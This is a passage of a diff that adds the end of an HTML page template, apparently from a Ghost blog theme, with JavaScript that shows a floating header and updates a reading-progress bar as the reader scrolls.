+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
